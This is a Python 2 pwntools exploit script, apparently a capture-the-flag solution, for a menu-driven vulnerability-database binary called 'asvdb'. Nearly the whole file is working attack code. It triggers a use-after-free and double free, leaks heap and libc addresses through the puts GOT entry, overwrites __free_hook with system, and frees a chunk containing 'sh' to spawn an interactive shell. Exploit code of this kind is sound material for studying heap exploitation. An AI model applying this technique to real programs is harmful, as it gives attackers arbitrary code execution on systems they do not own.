#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './asvdb'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()


# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
def c(idx):
      sla("> ", idx)
  
def new(length, description, title="1",year="1", idx="1", severity="1"):
    c(1)
    sla("Enter year: ", year)
    sla("Enter id: ", idx)
    if len(title) == 63:
        sa("Enter title (Up to 64 chars): ", title)
    else:
        sla("Enter title (Up to 64 chars): ", title)
    sla("Enter description size: ", length)
    if length == 0:
        pass
    elif len(description) >= length-1:
        sa("Enter description: ", description)
    else:
        sla("Enter description: ", description)
    sla("): ", severity)
 
def show(idx):
    c(4)
    sla("Enter bug index: ", idx)
 
def free(idx):
    c(3)
    sla("Enter bug index: ", idx)
 
def get_heap(idx):
    show(idx)
    ru("Description: ")
    return uu64(rl())

def get_libc(idx):
    show(idx)
    ru("title: ")
    return uu64(r(6))

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    new(0x10, '0')
    new(0x10, '1')
    new(0x60, '2')
    new(0x60, '3')
    new(0x60, '4')
    
    # cause uaf
    free(0)
    free(1)
    new(0x0, '') #0
    heap = get_heap(0) - 0x310
    lg("heap", heap)
    # cause double free
    free(0)
    puts_got = elf.got['puts']
    new(0x10, p64(heap+0x3d0)) #0---heap+0x3d0 = chunk2 struct
    free(3) #just for more space to new
    free(4)
    new(0x10, p64(0)) #1
    new(0x18, p64(0)+p32(puts_got)) #3--edit chunk2 title pointer
    new(0x70, p64(0)) #4-- no need,just for align
    libc.address = get_libc(2) - 0x809c0
    lg("libc", libc.address)
    
    free(3) #just for more space,because just 5
    free(4)
    free(1)

    new(0x0, '') #1
    free(1) # double free
    new(0x10, p64(libc.sym['__free_hook']), 'sh\x00')
    new(0x10, '1', "sh\x00")
    new(0x10, p64(libc.sym['system']), 'sh\x00')
    free(1)

    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("subprocess not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)

